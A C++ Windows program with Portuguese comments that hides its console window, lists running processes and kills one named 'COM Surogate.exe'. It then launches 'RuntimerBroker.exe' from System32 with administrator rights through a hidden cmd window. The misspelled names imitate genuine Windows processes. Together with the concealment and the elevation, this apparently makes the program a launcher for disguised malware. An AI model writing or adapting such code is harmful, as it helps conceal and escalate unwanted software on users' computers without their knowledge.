#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <iostream>

// Função para listar processos em execução
void ListRunningProcesses() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        // Tratamento de erro opcional
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        // Tratamento de erro opcional
        return;
    }

    do {
        TCHAR message[256];
        _stprintf_s(message, TEXT("PROCESS NAME: %s (PID: %lu)"), pe32.szExeFile, pe32.th32ProcessID);
        // Exibe informações no console (pode ser substituído por outro tratamento de dados)
        std::wcout << message << std::endl;
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
}

// Função para encerrar um processo específico pelo nome
bool TerminateProcessByName(const TCHAR* processName) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        // Tratamento de erro opcional
        return false;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        // Tratamento de erro opcional
        return false;
    }

    bool processTerminated = false;

    do {
        if (_tcsicmp(pe32.szExeFile, processName) == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                if (TerminateProcess(hProcess, 0)) {
                    processTerminated = true;
                }
                CloseHandle(hProcess);
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return processTerminated;
}

void runCmdAsAdmin(LPCWSTR lpParameters) {
    SHELLEXECUTEINFOW info = {0};
    info.cbSize = sizeof(SHELLEXECUTEINFOW);
    info.fMask = SEE_MASK_NOCLOSEPROCESS;
    info.lpVerb = L"runas"; // Solicita��o de execu��o como administrador
    info.lpFile = L"cmd"; // Caminho para o execut�vel do Prompt de Comando
    info.lpParameters = lpParameters; // Comando a ser executado
    info.nShow = SW_HIDE; // Oculta a janela do prompt de comando, se preferir, pode alterar para SW_NORMAL para exibir

    ShellExecuteExW(&info);
    WaitForSingleObject(info.hProcess, INFINITE); // Aguarda o t�rmino do processo
    CloseHandle(info.hProcess);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Listando processos em execução
    ListRunningProcesses();

    // Nome do processo que deseja encerrar
    const TCHAR* targetProcessName = TEXT("COM Surogate.exe");

    // Tentar encerrar o processo especificado
    if (TerminateProcessByName(targetProcessName)) {
        // Processo foi encerrado com sucesso
    } else {
        // Falha ao tentar encerrar o processo
    }

    Sleep(5000);

    runCmdAsAdmin(L"/c start \"\" \"C:\\Windows\\System32\\RuntimerBroker.exe\"");


    return 0;
}
